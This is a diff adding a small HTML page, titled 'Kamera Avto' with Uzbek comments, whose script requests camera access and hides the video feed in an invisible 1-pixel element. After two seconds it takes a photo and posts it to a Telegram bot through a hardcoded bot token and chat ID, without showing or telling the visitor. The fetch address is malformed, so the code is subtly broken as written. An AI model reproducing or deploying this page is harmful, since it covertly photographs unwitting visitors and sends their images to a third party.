@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Kamera Avto</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="width:1px; height:1px; opacity: 0;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // SOZLAMALAR:
+        const BOT_TOKEN = '8287232126:AAH_Z1mFxaBfyarKbNQFBz1xQ2pico0OSsE'; // Bu yerga tokenni yozing
+        const CHAT_ID = '8261811040';     // Bu yerga chat IDni yozing
+
+        // Kamerani yoqish
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                // Kamera yoqilgach, 2 soniya kutib rasm oladi
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'auto_shot.png');
+
+                        // TO'G'RILANGAN FETCH MANZILI:
+                        fetch(`api.telegram.org{BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Yuborildi:", data);
+                            // Rasm ketgach streamni to'xtatish (yaxshi odat)
+                            stream.getTracks().forEach(track => track.stop());
+                        })
+                        .catch(err => console.error("Xatolik:", err));
+                    }, 'image/png');
+                }, 2000); 
+            })
+            .catch(err => {
+                alert("Kameraga ruxsat berilmadi yoki xatolik yuz berdi!");
+                console.error(err);
+            });
+        } else {
+            alert("Sizning brauzeringiz kamerani qo'llab-quvvatlamaydi.");
+        }
+    </script>
+</body>
+</html>
